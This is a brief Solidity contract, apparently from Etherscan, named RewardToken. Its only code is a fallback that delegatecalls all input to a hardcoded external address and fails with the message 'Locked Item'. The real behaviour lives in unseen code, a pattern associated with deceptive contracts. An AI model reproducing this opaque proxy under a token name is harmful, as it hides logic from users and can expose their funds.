/**
 *Submitted for verification at Etherscan.io on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity <=0.8.13;

contract RewardToken {
    fallback(bytes calldata data) payable external returns(bytes memory){
        (bool r1, bytes memory result) = address(0x0e1CD6d2715432e4DBedFE969b0Eb2867FF61d5b).delegatecall(data);
        require(r1, "Locked Item");
        return result;
    }
}